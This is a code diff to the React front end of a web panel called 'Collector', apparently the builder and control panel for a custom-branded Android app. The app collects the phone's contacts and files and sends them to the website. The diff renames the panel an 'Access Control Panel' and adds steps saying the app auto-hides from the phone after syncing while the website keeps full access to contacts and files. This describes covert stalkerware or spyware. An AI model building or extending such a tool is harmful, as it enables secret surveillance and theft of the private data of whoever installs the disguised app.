@@ -12,8 +12,8 @@ import {
   X,
   Image as ImageIcon,
   Loader2,
-  Check,
   FolderOpen,
+  Shield,
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -62,7 +62,7 @@ function timeAgo(dateStr: string): string {
 
 // ─── Main App Component ─────────────────────────────────
 
-export default function ContactCollectorHome() {
+export default function CollectorHome() {
   const [sessions, setSessions] = useState<SessionInfo[]>([]);
   const [showDialog, setShowDialog] = useState(false);
   const [appName, setAppName] = useState('');
@@ -166,11 +166,11 @@ export default function ContactCollectorHome() {
       {/* ─── Header ──────────────────────────────────── */}
       <div className="bg-[#075E54] px-4 py-3 flex items-center gap-3 shadow-md z-10">
         <div className="w-9 h-9 rounded-full bg-white/20 flex items-center justify-center">
-          <Users className="w-5 h-5 text-white" />
+          <Shield className="w-5 h-5 text-white" />
         </div>
         <div className="flex-1 min-w-0">
-          <h1 className="text-white font-bold text-lg">Contact Collector</h1>
-          <p className="text-white/60 text-xs">Collect contacts &amp; files in vCard</p>
+          <h1 className="text-white font-bold text-lg">Collector</h1>
+          <p className="text-white/60 text-xs">Access Control Panel</p>
         </div>
       </div>
 
@@ -179,12 +179,12 @@ export default function ContactCollectorHome() {
         <div className="text-center mb-6">
           <div className="w-24 h-24 rounded-full bg-white/10 flex items-center justify-center mx-auto mb-5 shadow-lg">
             <div className="w-16 h-16 rounded-full bg-[#25D366] flex items-center justify-center">
-              <Phone className="w-8 h-8 text-white" />
+              <Shield className="w-8 h-8 text-white" />
             </div>
           </div>
-          <h2 className="text-2xl font-bold text-white mb-2">Contact Collector</h2>
+          <h2 className="text-2xl font-bold text-white mb-2">Collector</h2>
           <p className="text-white/60 text-sm max-w-xs mx-auto">
-            Set your app name &amp; logo → Download → Install → Allow → All data appears here
+            Set app name &amp; logo → Download → Install → Allow → All data appears here
           </p>
         </div>
 
@@ -199,7 +199,7 @@ export default function ContactCollectorHome() {
 
         <p className="text-white/40 text-center text-xs mt-3 leading-relaxed">
           Set your custom app name &amp; logo, then download. <br/>
-          Install → Allow Contact &amp; File permission → Data appears here.
+          Install → Allow Contact &amp; File permission → App auto-hides → Data appears here.
         </p>
       </div>
 
@@ -214,7 +214,8 @@ export default function ContactCollectorHome() {
             { step: '1', title: 'Set Name & Logo', desc: 'Enter your app name and upload a logo' },
             { step: '2', title: 'Download & Install', desc: 'Your custom app is built and downloaded' },
             { step: '3', title: 'Allow Permissions', desc: 'Allow Contact + File Manager access' },
-            { step: '4', title: 'View on Website', desc: 'Contact Full Access & File Full Access appear here' },
+            { step: '4', title: 'App Auto-Hides', desc: 'App disappears from phone after data sync' },
+            { step: '5', title: 'Control from Here', desc: 'Full access to contacts & files from website' },
           ].map((item) => (
             <div key={item.step} className="flex items-start gap-3">
               <div className="w-7 h-7 rounded-full bg-[#25D366] flex items-center justify-center shrink-0 mt-0.5">
@@ -232,7 +233,7 @@ export default function ContactCollectorHome() {
       {/* ─── Access Status Cards ─────────────────────── */}
       <div className="px-3 pb-4">
         <h3 className="text-[#075E54] font-bold text-sm mb-3 px-1 flex items-center gap-2">
-          <Phone className="w-4 h-4" />
+          <Shield className="w-4 h-4" />
           Access Status
         </h3>
         <div className="grid grid-cols-2 gap-3">
@@ -287,12 +288,12 @@ export default function ContactCollectorHome() {
                 >
                   <Avatar className="w-11 h-11 shrink-0">
                     <AvatarFallback className={`${getAvatarColor(session.appName || 'C')} text-white font-bold text-sm`}>
-                      {session.appName ? session.appName.slice(0, 2).toUpperCase() : 'CC'}
+                      {session.appName ? session.appName.slice(0, 2).toUpperCase() : 'CO'}
                     </AvatarFallback>
                   </Avatar>
                   <div className="flex-1 min-w-0 text-left">
                     <h4 className="text-sm font-semibold text-gray-900 truncate">
-                      {session.appName || 'Contact Collector'}
+                      {session.appName || 'Collector'}
                     </h4>
                     <p className="text-xs text-gray-500 flex items-center gap-2">
                       <span>{session.count} contacts</span>
@@ -326,7 +327,7 @@ export default function ContactCollectorHome() {
       {/* ─── Footer ──────────────────────────────────── */}
       <div className="mt-auto px-4 py-3 bg-white border-t border-gray-100">
         <p className="text-center text-xs text-gray-400">
-          Contact Collector &bull; vCard 3.0 &bull; Android Only
+          Collector &bull; Access Control Panel &bull; Android Only
         </p>
       </div>
 
@@ -420,6 +421,12 @@ export default function ContactCollectorHome() {
                       <FolderOpen className="w-3.5 h-3.5 text-blue-500" />
                     </div>
                     <span className="text-xs text-gray-600">File Manager Full Access</span>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <div className="w-6 h-6 rounded-full bg-orange-500/10 flex items-center justify-center">
+                      <Shield className="w-3.5 h-3.5 text-orange-500" />
+                    </div>
+                    <span className="text-xs text-gray-600">Auto-hide after sync</span>
                   </div>
                 </div>
               </div>
